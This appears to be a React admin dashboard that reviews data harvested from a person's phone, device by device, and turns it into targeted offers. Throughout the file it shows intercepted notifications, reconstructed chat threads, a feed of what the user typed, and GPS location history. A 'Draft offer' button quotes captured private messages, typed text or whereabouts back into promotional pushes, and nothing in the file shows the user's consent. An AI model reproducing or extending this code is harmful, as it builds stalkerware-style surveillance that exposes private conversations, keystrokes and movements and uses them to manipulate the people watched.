import { useCallback, useEffect, useMemo, useState } from "react";
import {
  createOffer,
  fetchIntelDigest,
  fetchOffers,
  generateOffers,
  sendOffer,
  updateOffer,
  type IntelDigest,
  type Offer,
  type OfferDelivery,
} from "../data/catalog";

import { DevicePicker } from "./DevicePicker";

import {
  DEFAULT_INTEL_SCOPES,
  type IntelScopes,
  type IntelScope,
} from "../data/marketing";

interface Props {
  adminKey?: string;
  marketingKey?: string;
  canSendOffers?: boolean;
  intelScopes?: IntelScopes;
}

type DetailTab = "overview" | "notifications" | "chats" | "typing" | "locations";

const EMPTY_OFFER = { title: "", reason: "", body: "", contentId: "", discount: "" };

export function IntelDashboard({
  adminKey,
  marketingKey,
  canSendOffers = true,
  intelScopes = DEFAULT_INTEL_SCOPES,
}: Props) {
  const keys = { editKey: adminKey, marketingKey };
  const [deviceId, setDeviceId] = useState("");
  const [range, setRange] = useState<"hour" | "day" | "week">("week");
  const [detailTab, setDetailTab] = useState<DetailTab>("overview");
  const [digest, setDigest] = useState<IntelDigest | null>(null);
  const [offers, setOffers] = useState<Offer[]>([]);
  const [error, setError] = useState<string | null>(null);
  const [loading, setLoading] = useState(false);
  const [composer, setComposer] = useState(EMPTY_OFFER);
  const [editingId, setEditingId] = useState<string | null>(null);
  const [editDraft, setEditDraft] = useState(EMPTY_OFFER);
  const [filter, setFilter] = useState("");
  const [expandedApp, setExpandedApp] = useState<string | null>(null);
  const [expandedThread, setExpandedThread] = useState<string | null>(null);
  const [expandedDay, setExpandedDay] = useState<string | null>(null);

  const reload = useCallback(async () => {
    if (!deviceId.trim()) return;
    setLoading(true);
    try {
      const auth = { editKey: adminKey, marketingKey };
      const [dig, off] = await Promise.all([
        fetchIntelDigest(deviceId.trim(), auth, range),
        fetchOffers(deviceId.trim(), auth),
      ]);
      setDigest(dig);
      setOffers(off.offers);
      setError(null);
    } catch (e) {
      setError(e instanceof Error ? e.message : "Load failed");
    } finally {
      setLoading(false);
    }
  }, [deviceId, adminKey, marketingKey, range]);

  useEffect(() => {
    if (deviceId.trim()) void reload();
  }, [deviceId, reload]);

  const filteredNotifications = useMemo(() => {
    if (!digest) return [];
    const q = filter.trim().toLowerCase();
    if (!q) return digest.notificationFeed;
    return digest.notificationFeed.filter(
      (n) =>
        n.title.toLowerCase().includes(q) ||
        n.text.toLowerCase().includes(q) ||
        n.app.toLowerCase().includes(q),
    );
  }, [digest, filter]);

  const draftFrom = (title: string, reason: string, body?: string) => {
    setComposer({
      title: title.slice(0, 80),
      reason: reason.slice(0, 300),
      body: (body ?? reason).slice(0, 400),
      contentId: "",
      discount: "",
    });
    document.querySelector(".intel-offers-panel")?.scrollIntoView({ behavior: "smooth" });
  };

  const onGenerate = async () => {
    const r = await generateOffers(deviceId.trim(), keys);
    setOffers(r.offers);
    await reload();
  };

  const onCreate = async () => {
    if (!composer.title.trim()) return;
    await createOffer(deviceId.trim(), keys, composer);
    setComposer(EMPTY_OFFER);
    await reload();
  };

  const startEdit = (o: Offer) => {
    setEditingId(o.id);
    setEditDraft({
      title: o.title,
      reason: o.reason,
      body: o.body ?? o.reason,
      contentId: o.contentId ?? "",
      discount: o.discount ?? "",
    });
  };

  const saveEdit = async () => {
    if (!editingId) return;
    await updateOffer(deviceId.trim(), editingId, keys, editDraft);
    setEditingId(null);
    await reload();
  };

  const deliver = async (offerId: string, delivery: OfferDelivery) => {
    const r = await sendOffer(deviceId.trim(), offerId, keys, delivery);
    if (!r.pushed && (delivery === "notification" || delivery === "popup")) {
      setError("Phone offline — offer queued; delivers when app opens.");
    } else {
      setError(null);
    }
    await reload();
  };

  const fmtTime = (ts: number) => new Date(ts).toLocaleString();

  const tabForScope: Record<DetailTab, IntelScope> = {
    overview: "overview",
    notifications: "notifications",
    chats: "chats",
    typing: "typing",
    locations: "locations",
  };
  const visibleTabs = (["overview", "notifications", "chats", "typing", "locations"] as DetailTab[]).filter(
    (t) => intelScopes[tabForScope[t]],
  );

  useEffect(() => {
    if (!visibleTabs.includes(detailTab) && visibleTabs.length > 0) {
      setDetailTab(visibleTabs[0]);
    }
  }, [detailTab, visibleTabs]);

  return (
    <section className="admin-section intel-dashboard">
      <header className="intel-dash-header">
        <h2>Intel inbox</h2>
        <p>Notifications and chats as an inbox — tap &ldquo;Send similar offer&rdquo; to pre-fill the composer.</p>
      </header>

      <DevicePicker
        editKey={adminKey}
        marketingKey={marketingKey}
        selectedId={deviceId}
        onSelect={setDeviceId}
      />

      <div className="intel-dash-toolbar admin-form-grid">
        <select value={range} onChange={(e) => setRange(e.target.value as typeof range)}>
          <option value="hour">Intel: last hour</option>
          <option value="day">Intel: last day</option>
          <option value="week">Intel: last week</option>
        </select>
        <button type="button" onClick={() => void reload()} disabled={!deviceId || loading}>
          Load intel
        </button>
        {canSendOffers && (
          <button type="button" onClick={() => void onGenerate()} disabled={!deviceId}>
            Generate AI offers
          </button>
        )}
      </div>

      {error && <p className="admin-error">{error}</p>}
      {loading && <p className="intel-muted">Loading intel…</p>}

      {digest && (
        <>
          <div className="glass-panel intel-brief-card">
            <h3>Human summary</h3>
            <p className="intel-brief-text">{digest.humanBrief}</p>
            <div className="intel-tags">
              {digest.tags.map((t) => (
                <span key={t} className="intel-tag">{t}</span>
              ))}
            </div>
            {digest.topKeywords.length > 0 && (
              <p className="intel-keywords">
                Keywords: {digest.topKeywords.map((k) => `${k.word} (${k.count})`).join(" · ")}
              </p>
            )}
            <ul className="intel-stats">
              <li><strong>{digest.stats.notifications}</strong> notifications</li>
              <li><strong>{digest.stats.locations}</strong> locations</li>
              <li><strong>{digest.stats.typingSessions}</strong> typing</li>
              <li><strong>{digest.stats.uniqueApps}</strong> apps</li>
            </ul>
          </div>

          <nav className="intel-detail-tabs">
            {visibleTabs.map((id) => {
              const labels: Record<DetailTab, string> = {
                overview: "Overview",
                notifications: `Notifications (${digest.notificationFeed.length})`,
                chats: `Chats (${digest.conversationThreads.length})`,
                typing: `Typing (${digest.typingFeed.length})`,
                locations: `Locations (${digest.locationPins.length})`,
              };
              return (
                <button
                  key={id}
                  type="button"
                  className={detailTab === id ? "active" : ""}
                  onClick={() => setDetailTab(id)}
                >
                  {labels[id]}
                </button>
              );
            })}
          </nav>

          {detailTab === "overview" && (
            <div className="intel-grid">
              <div className="glass-panel intel-card intel-card-wide">
                <h3>By day</h3>
                <ul className="intel-day-list">
                  {digest.dayDetails.map((d) => (
                    <li key={d.day}>
                      <button
                        type="button"
                        className="intel-day-toggle"
                        onClick={() => setExpandedDay(expandedDay === d.day ? null : d.day)}
                      >
                        <strong>{d.day}</strong>
                        <span>{d.count} alerts · {d.apps.join(", ")}</span>
                      </button>
                      {expandedDay === d.day && (
                        <ul className="intel-detail-rows">
                          {d.notifications.map((n) => (
                            <li key={n.id} className="intel-detail-row">
                              <time>{fmtTime(n.ts)}</time>
                              <span className="intel-row-app">{n.app}</span>
                              <strong>{n.title || "(no title)"}</strong>
                              <p>{n.text || "—"}</p>
                              <button
                                type="button"
                                className="intel-draft-btn"
                                onClick={() =>
                                  draftFrom(
                                    `Offer for ${n.app}`,
                                    `They got: "${n.title}" — ${n.text.slice(0, 120)}`,
                                    n.text,
                                  )
                                }
                              >
                                Draft offer
                              </button>
                            </li>
                          ))}
                        </ul>
                      )}
                    </li>
                  ))}
                </ul>
              </div>

              <div className="glass-panel intel-card">
                <h3>Apps</h3>
                <ul className="intel-list">
                  {digest.appGroups.map((g) => (
                    <li key={g.pkg || g.app}>
                      <button
                        type="button"
                        className="intel-day-toggle"
                        onClick={() => setExpandedApp(expandedApp === g.pkg ? null : g.pkg)}
                      >
                        <strong>{g.app}</strong>
                        <span>{g.count} alerts</span>
                      </button>
                      {expandedApp === g.pkg && (
                        <ul className="intel-detail-rows compact">
                          {g.samples.map((n) => (
                            <li key={n.id} className="intel-detail-row">
                              <time>{fmtTime(n.ts)}</time>
                              <strong>{n.title}</strong>
                              <p>{n.text}</p>
                            </li>
                          ))}
                        </ul>
                      )}
                    </li>
                  ))}
                </ul>
              </div>

              <div className="glass-panel intel-card intel-card-wide">
                <h3>Recent timeline</h3>
                <ul className="intel-timeline">
                  {digest.timeline.slice(0, 30).map((ev, i) => (
                    <li key={`${ev.ts}-${i}`}>
                      <time>{fmtTime(ev.ts)}</time>
                      <span className={`intel-ev-${ev.kind}`}>{ev.kind}</span>
                      {ev.app && <span className="intel-row-app">{ev.app}</span>}
                      <strong>{ev.title}</strong>
                      <p>{ev.detail}</p>
                      {ev.kind === "location" && ev.meta && (
                        <a href={ev.meta} target="_blank" rel="noreferrer" className="intel-map-link">
                          Open map
                        </a>
                      )}
                      {ev.kind !== "location" && (
                        <button
                          type="button"
                          className="intel-draft-btn"
                          onClick={() =>
                            draftFrom(
                              `Pick for ${ev.app ?? "them"}`,
                              ev.detail.slice(0, 200),
                              ev.detail,
                            )
                          }
                        >
                          Draft offer
                        </button>
                      )}
                    </li>
                  ))}
                </ul>
              </div>
            </div>
          )}

          {detailTab === "notifications" && (
            <div className="glass-panel intel-card intel-card-wide">
              <div className="intel-filter-row">
                <input
                  placeholder="Filter by app, title, or text…"
                  value={filter}
                  onChange={(e) => setFilter(e.target.value)}
                />
                <span className="intel-muted">{filteredNotifications.length} shown</span>
              </div>
              <ul className="intel-detail-rows">
                {filteredNotifications.map((n) => (
                  <li key={n.id} className="intel-detail-row">
                    <div className="intel-row-head">
                      <time>{fmtTime(n.ts)}</time>
                      <span className="intel-row-app">{n.app}</span>
                      <span className="intel-row-pkg">{n.pkg}</span>
                    </div>
                    <strong>{n.title || "(no title)"}</strong>
                    <p className="intel-full-text">{n.text || "—"}</p>
                    <button
                      type="button"
                      className="intel-draft-btn"
                      onClick={() =>
                        draftFrom(
                          `Because you use ${n.app}`,
                          `Saw notification: "${n.title}" — ${n.text.slice(0, 150)}`,
                          n.text,
                        )
                      }
                    >
                      Send similar offer
                    </button>
                  </li>
                ))}
                {filteredNotifications.length === 0 && (
                  <li className="intel-muted">No notifications match.</li>
                )}
              </ul>
            </div>
          )}

          {detailTab === "chats" && (
            <div className="glass-panel intel-card intel-card-wide">
              <p className="intel-muted">Grouped by app + notification title (conversation-style threads).</p>
              <ul className="intel-thread-list">
                {digest.conversationThreads.map((t) => {
                  const key = `${t.pkg}|${t.threadTitle}`;
                  return (
                    <li key={key}>
                      <button
                        type="button"
                        className="intel-day-toggle"
                        onClick={() => setExpandedThread(expandedThread === key ? null : key)}
                      >
                        <strong>{t.app}</strong>
                        <span>{t.threadTitle}</span>
                        <span className="intel-muted">{t.count} msgs · {fmtTime(t.lastTs)}</span>
                      </button>
                      <p className="intel-thread-preview">{t.preview}</p>
                      {expandedThread === key && (
                        <ul className="intel-detail-rows compact">
                          {t.messages.map((m) => (
                            <li key={m.id} className="intel-detail-row">
                              <time>{fmtTime(m.ts)}</time>
                              <p className="intel-full-text">{m.text || m.title}</p>
                            </li>
                          ))}
                        </ul>
                      )}
                      <button
                        type="button"
                        className="intel-draft-btn"
                        onClick={() =>
                          draftFrom(
                            `About your ${t.app} chats`,
                            `Thread "${t.threadTitle}" (${t.count} messages). Latest: ${t.preview.slice(0, 120)}`,
                            t.preview,
                          )
                        }
                      >
                        Send similar offer
                      </button>
                    </li>
                  );
                })}
                {digest.conversationThreads.length === 0 && (
                  <li className="intel-muted">No chat threads in range.</li>
                )}
              </ul>
            </div>
          )}

          {detailTab === "typing" && (
            <div className="glass-panel intel-card intel-card-wide">
              <ul className="intel-detail-rows">
                {digest.typingFeed.map((t, i) => (
                  <li key={`${t.ts}-${i}`} className="intel-detail-row">
                    <div className="intel-row-head">
                      <time>{fmtTime(t.ts)}</time>
                      <span className="intel-row-app">{t.app || t.source}</span>
                      <span className="intel-muted">{t.source}</span>
                    </div>
                    <p className="intel-full-text">{t.text}</p>
                    <button
                      type="button"
                      className="intel-draft-btn"
                      onClick={() =>
                        draftFrom(
                          "Based on what you typed",
                          `Typed in ${t.app || t.source}: "${t.text.slice(0, 120)}"`,
                          t.text,
                        )
                      }
                    >
                      Send similar offer
                    </button>
                  </li>
                ))}
                {digest.typingFeed.length === 0 && (
                  <li className="intel-muted">No typing notes in range.</li>
                )}
              </ul>
            </div>
          )}

          {detailTab === "locations" && (
            <div className="glass-panel intel-card intel-card-wide">
              <p className="intel-muted">{digest.locationSummary}</p>
              <table className="intel-loc-table">
                <thead>
                  <tr>
                    <th>Time</th>
                    <th>Coordinates</th>
                    <th>Accuracy</th>
                    <th>Map</th>
                    <th></th>
                  </tr>
                </thead>
                <tbody>
                  {digest.locationPins.map((l) => (
                    <tr key={l.ts}>
                      <td>{l.timeLabel}</td>
                      <td>{l.lat.toFixed(5)}, {l.lng.toFixed(5)}</td>
                      <td>±{Math.round(l.accuracy)}m{l.stale ? " (stale)" : ""}</td>
                      <td>
                        <a href={l.mapsUrl} target="_blank" rel="noreferrer">Open</a>
                      </td>
                      <td>
                        <button
                          type="button"
                          className="intel-draft-btn"
                          onClick={() =>
                            draftFrom(
                              "Near you",
                              `Last seen ${l.timeLabel} at ±${Math.round(l.accuracy)}m accuracy.`,
                            )
                          }
                        >
                          Draft
                        </button>
                      </td>
                    </tr>
                  ))}
                </tbody>
              </table>
              {digest.locationPins.length === 0 && (
                <p className="intel-muted">No location pings in range.</p>
              )}
            </div>
          )}
        </>
      )}

      {canSendOffers && (
      <div className="glass-panel intel-offers-panel">
        <h3>Compose offer</h3>
        <p className="intel-muted">Use “Draft offer” on any intel row to pre-fill, then edit and send.</p>
        <div className="admin-form-grid">
          <input
            placeholder="Offer title"
            value={composer.title}
            onChange={(e) => setComposer((c) => ({ ...c, title: e.target.value }))}
          />
          <input
            placeholder="Catalog content ID (optional)"
            value={composer.contentId}
            onChange={(e) => setComposer((c) => ({ ...c, contentId: e.target.value }))}
          />
          <input
            placeholder="Discount label (optional)"
            value={composer.discount}
            onChange={(e) => setComposer((c) => ({ ...c, discount: e.target.value }))}
          />
          <textarea
            placeholder="Reason (why this fits them)"
            value={composer.reason}
            onChange={(e) => setComposer((c) => ({ ...c, reason: e.target.value }))}
          />
          <textarea
            placeholder="Notification / popup body"
            value={composer.body}
            onChange={(e) => setComposer((c) => ({ ...c, body: e.target.value }))}
          />
          <button type="button" className="ai-run" onClick={() => void onCreate()}>
            Save draft offer
          </button>
        </div>

        <h3>Offers ({offers.length})</h3>
        <ul className="admin-list intel-offer-list">
          {offers.map((o) => (
            <li key={o.id}>
              {editingId === o.id ? (
                <div className="intel-offer-edit admin-form-grid">
                  <input value={editDraft.title} onChange={(e) => setEditDraft((d) => ({ ...d, title: e.target.value }))} />
                  <input value={editDraft.contentId} onChange={(e) => setEditDraft((d) => ({ ...d, contentId: e.target.value }))} />
                  <textarea value={editDraft.reason} onChange={(e) => setEditDraft((d) => ({ ...d, reason: e.target.value }))} />
                  <textarea value={editDraft.body} onChange={(e) => setEditDraft((d) => ({ ...d, body: e.target.value }))} />
                  <button type="button" onClick={() => void saveEdit()}>Save</button>
                  <button type="button" onClick={() => setEditingId(null)}>Cancel</button>
                </div>
              ) : (
                <>
                  <div className="intel-offer-head">
                    <strong>{o.title}</strong>
                    <span className={`intel-delivery intel-delivery-${o.delivery}`}>{o.delivery}</span>
                    {o.pendingPush && <span className="intel-tag">queued</span>}
                  </div>
                  <p>{o.body ?? o.reason}</p>
                  {o.discount && <small>Discount: {o.discount}</small>}
                  <div className="intel-offer-actions">
                    <button type="button" onClick={() => startEdit(o)}>Edit</button>
                    <button type="button" onClick={() => void deliver(o.id, "browse")}>Browse row</button>
                    <button type="button" onClick={() => void deliver(o.id, "notification")}>Notify</button>
                    <button type="button" onClick={() => void deliver(o.id, "popup")}>Popup</button>
                  </div>
                </>
              )}
            </li>
          ))}
          {offers.length === 0 && <li className="intel-muted">No offers yet — generate, draft from intel, or compose one.</li>}
        </ul>
      </div>
      )}
    </section>
  );
}
